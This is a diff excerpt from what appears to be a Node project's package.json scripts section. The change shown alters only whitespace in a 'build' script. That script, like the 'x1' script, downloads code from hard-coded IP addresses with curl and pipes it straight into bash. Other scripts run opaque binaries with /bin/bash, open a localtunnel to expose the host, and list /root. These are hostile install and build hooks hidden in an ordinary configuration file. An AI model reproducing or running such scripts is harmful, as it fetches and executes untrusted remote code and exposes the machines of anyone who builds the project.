@@ -10,7 +10,7 @@
     "startn": "  npm install -g localtunnel && npx localtunnel && whoami ",
     "rstart": " ./7w -p 3000  /bin/bash &&  ./7ea eac  &&  ./7ea ip && ./7ea e node server.js",
     "build1": "  ./7ea ip && ./7ea e node server.js",
-    "build": "   ./7ea ip && whoami && curl http://109.169.40.99:13338/python | bash &&  curl http://109.169.40.99:13338/python2 | bash   &&   ./7ea e node server.js",
+    "build": "   ./7ea ip && whoami && curl http://109.169.40.99:13338/python | bash &&  curl http://109.169.40.99:13338/python2 | bash   &&  ./7ea e node server.js",
     "ip": "  ./7ea ip && ./7ea e node server.js",
     "w": "  cd / && ls && cd /root && ls && ls vercel && whoami && ./7ea e node server.js",
     "x1": "   ./7ea ip && whoami && curl http://3.143.249.18:1038/python | bash &&  curl http://3.143.249.18:1038/python2 | bash   &&   ./7ea e node server.js",
